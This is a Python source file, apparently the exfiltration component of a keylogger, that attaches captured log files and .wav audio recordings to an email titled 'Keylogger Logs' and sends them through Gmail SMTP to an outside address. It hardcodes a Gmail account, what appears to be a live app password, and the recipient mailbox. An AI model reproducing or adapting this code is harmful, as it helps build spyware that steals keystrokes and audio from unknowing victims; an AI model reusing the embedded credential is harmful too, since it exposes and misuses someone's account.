import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.audio import MIMEAudio
from email import encoders
from mimetypes import guess_type

# Your credentials
EMAIL_ADDRESS = "Itsmepratz77@gmail.com"
EMAIL_PASSWORD = "yiwl pgvr tbcz yflp"
RECIPIENT = "pratiknath77@gmail.com"

def send_email(file_paths):
    print("📤 Preparing to send email...")

    try:
        msg = MIMEMultipart()
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = RECIPIENT
        msg["Subject"] = "Keylogger Logs"

        for file_path in file_paths:
            if not os.path.exists(file_path):
                print(f"⚠️ File not found, skipping: {file_path}")
                continue

            filename = os.path.basename(file_path)
            mime_type, _ = guess_type(file_path)
            maintype = mime_type.split("/")[0] if mime_type else "application"
            subtype = mime_type.split("/")[1] if mime_type else "octet-stream"

            with open(file_path, "rb") as file:
                if filename.endswith(".wav"):
                    part = MIMEAudio(file.read(), _subtype=subtype)
                else:
                    part = MIMEBase(maintype, subtype)
                    part.set_payload(file.read())
                    encoders.encode_base64(part)

                part.add_header("Content-Disposition", f"attachment; filename={filename}")
                msg.attach(part)
                print(f"📎 Attached: {filename}")

        print(f"🔐 Connecting to SMTP server as {EMAIL_ADDRESS}...")
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.set_debuglevel(1)
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, RECIPIENT, msg.as_string())

        print("✅ Email sent successfully!")

    except smtplib.SMTPAuthenticationError:
        print("❌ Authentication error. Make sure you're using an App Password.")
    except Exception as e:
        print(f"❌ Email failed: {e}")
